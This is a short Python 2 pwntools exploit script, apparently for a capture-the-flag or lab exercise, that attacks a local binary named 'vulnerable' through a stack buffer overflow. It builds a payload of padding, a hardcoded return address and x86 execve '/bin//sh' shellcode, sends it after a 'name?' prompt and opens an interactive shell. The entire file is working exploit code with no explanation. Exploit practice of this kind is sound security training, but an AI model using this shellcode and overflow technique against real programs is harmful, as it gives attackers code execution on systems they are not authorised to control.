#!/usr/bin/env python2

from pwn import *

context(terminal=["tmux", "new-window"])

buf = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xcd\x80"

junk = "A"*44

addr = p32(0xffffd220)

p = process("./vulnerable")
# p = gdb.debug("./vulnerable", "b vuln")

payload = junk  + addr + buf

p.recvuntil("name?")
p.sendline(payload)
p.interactive()
